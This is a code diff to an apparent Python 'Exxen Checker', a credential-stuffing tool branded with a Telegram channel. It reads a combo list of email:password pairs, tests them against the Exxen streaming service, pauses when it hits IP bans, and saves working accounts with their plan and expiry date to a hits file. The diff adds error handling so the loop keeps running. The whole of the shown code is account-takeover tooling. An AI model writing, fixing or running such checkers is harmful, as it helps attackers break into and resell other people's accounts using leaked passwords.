@@ -68,8 +68,8 @@ def chkex():
     for mp in open(comboo,'r').read().splitlines():
             try:
                 mp=mp.replace("\n","")
-                user = mp.split(':')[0]
-                pas = mp.split(':')[1]
+                user =str(mp.split(':')[0])
+                pas =str(mp.split(':')[1])
             except:
                 print("Yanliş Gmail pass Türü")
                 pass
@@ -94,21 +94,24 @@ def chkex():
                 print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
                 time.sleep(10)
             if "PackageName" in veri:
-                if "LicenseName" in veri:
-                    lisans=veri.split('LicenseName":"')[1]
-                    lisans=lisans.split('"')[0]
-                    LicenseEndDate=veri.split('LicenseEndDate":"')[1]
-                    LicenseEndDate=LicenseEndDate.split('"')[0]
-                    ms="""
-╭─➢ ☄ ZET| Exxen Checker ☄
-├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
-├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-├◉[𝙿𝚕𝚊𝚗]➢ """+str(lisans)+"""
-├◉[𝚃𝚊𝚛𝚒𝚑]➢ """+str(LicenseEndDate)+"""
-╰─◉➤ Telegram Channel: @ZetTekno\n
-"""
-                    print(ms)
-                    open("/sdcard/combo/hit-Exxen.txt","a").write(ms)
+                try:
+                    if "LicenseName" in veri:
+                        lisans=veri.split('LicenseName":"')[1]
+                        lisans=lisans.split('"')[0]
+                        LicenseEndDate=veri.split('LicenseEndDate":"')[1]
+                        LicenseEndDate=LicenseEndDate.split('"')[0]
+                        ms="""
+    ╭─➢ ☄ ZET| Exxen Checker ☄
+    ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+    ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+    ├◉[𝙿𝚕𝚊𝚗]➢ """+str(lisans)+"""
+    ├◉[𝚃𝚊𝚛𝚒𝚑]➢ """+str(LicenseEndDate)+"""
+    ╰─◉➤ Telegram Channel: @ZetTekno\n
+    """
+                        print(ms)
+                        open("/sdcard/combo/hit-Exxen.txt","a").write(ms)
+                except:
+                    print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
             else:
                 print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
 
